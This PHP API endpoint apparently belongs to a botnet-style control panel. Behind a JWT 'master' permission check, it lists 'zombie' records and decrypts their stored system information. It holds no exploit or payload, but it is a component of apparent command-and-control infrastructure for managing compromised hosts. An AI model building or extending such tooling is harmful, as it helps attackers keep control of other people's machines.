<?php
// required headers
header("Access-Control-Allow-Origin: *");
header("Content-Type: application/json; charset=UTF-8");
header("Access-Control-Allow-Methods: POST");
header("Access-Control-Max-Age: 3600");
header("Access-Control-Allow-Headers: Content-Type, Access-Control-Allow-Headers, Authorization, X-Requested-With");
 
// required to encode json web token
include_once 'config/core.php';
include_once 'libs/php-jwt/src/BeforeValidException.php';
include_once 'libs/php-jwt/src/ExpiredException.php';
include_once 'libs/php-jwt/src/SignatureInvalidException.php';
include_once 'libs/php-jwt/src/JWT.php';
use \Firebase\JWT\JWT;
 
// files needed to connect to database
include_once 'config/database.php';
include_once 'objects/zombie.php';

// auxilar functions
include_once 'util/check_permission.php';
include_once 'util/crypt.php';
 
// get posted data
$data = json_decode(file_get_contents("php://input"));
 
// get jwt
$jwt=isset($data->jwt) ? $data->jwt : "";
 
// if jwt is not empty
if($jwt){
 
    // if decode succeed, show user details
    try {
 
        // decode jwt
        $decoded = JWT::decode($jwt, $key, array('HS256'));
        // Check who request and permission
        $requested_by = $decoded->data->username;
        //$to_update = $data->username;
        // this function raise exceptions in case of error (not requested by a master, or requesting changes on another master)
        check_master_permissions($requested_by);

        // get database connection
        $database = new Database();
        $db = $database->getConnection();
        
        // instantiate user object
        $zombie = new Zombie($db);

        // set filters
        $by_id = (isset($data->id)) ? $data->id : "";
        $by_username =  (isset($data->username)) ? $data->username : "";
        $by_os =  (isset($data->sysinfo)) ? $data->sysinfo : "";
        $by_created_bef =  (isset($data->created_bef)) ? $data->created_bef : "";
        $by_created_aft =  (isset($data->created_aft)) ? $data->created_aft : "";
        
        // retrieve records
        $zombies_data = $zombie->read($by_id, $by_username, $by_created_bef, $by_created_aft, $by_os);

        if ($zombies_data) {
            for ($i=0; $i < count($zombies_data); $i++) { 
                $zombies_data[$i]["sysinfo"] = json_decode(decrypt($zombies_data[$i]["sysinfo"], $key));
            }
        }

        if($zombies_data){
            
            // set response code
            http_response_code(200);
            
            // response in json format
            echo json_encode($zombies_data);
        }
        
        // message if unable to update user
        else{
            // set response code
            http_response_code(401);
        
            // show error message
            echo json_encode(array("message" => "Any zombie found."));
        }
    }
 
    // if decode fails, it means jwt is invalid or check_permission fails
    catch (Exception $e){
    
        // set response code
        http_response_code(401);
    
        // show error message
        echo json_encode(array(
            "message" => "Access denied.",
            "error" => $e->getMessage()
        ));
    }
}
 

// show error message if jwt is empty
else{
 
    // set response code
    http_response_code(401);
 
    // tell the user access denied
    echo json_encode(array("message" => "Access denied."));
}
?>